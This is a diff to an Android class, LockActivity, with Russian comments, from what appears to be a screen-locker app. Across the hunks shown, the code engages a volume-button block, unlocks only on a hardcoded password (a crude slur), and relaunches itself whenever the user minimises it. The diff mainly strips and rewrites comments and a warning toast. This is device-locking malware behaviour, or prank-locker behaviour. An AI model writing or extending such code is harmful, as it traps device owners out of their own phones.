@@ -34,7 +34,6 @@ public class LockActivity extends Activity {
         super.onCreate(b);
         setContentView(R.layout.activity_lock);
 
-        // Включаем блокировку для слушателя приложений
         VolumeBlockService.setLocked(true);
 
         getWindow().addFlags(
@@ -160,7 +159,6 @@ public class LockActivity extends Activity {
                 String password = passwordInput.getText().toString();
                 if (password.equals("pidori")) {
                     isUnlocked = true;
-                    // Отключаем блокировку вылета для других приложений
                     VolumeBlockService.setLocked(false);
                     
                     if (mp != null) {
@@ -265,7 +263,7 @@ public class LockActivity extends Activity {
     protected void onPause() {
         super.onPause();
         if (!isUnlocked) {
-            Toast.makeText(this, "ЗАМЕЧЕНА ПОПЫТКА ВЫХОДА БЛОКИРУЮ", Toast.LENGTH_SHORT).show();
+            // Если приложение свернули (нажали квадрат), возвращаем его
             Intent intent = new Intent(this, LockActivity.class);
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
             intent.putExtra("RETURNING_FROM_EXIT", true);
@@ -283,4 +281,4 @@ public class LockActivity extends Activity {
         }
         handler.removeCallbacksAndMessages(null);
     }
-                        }
+            }
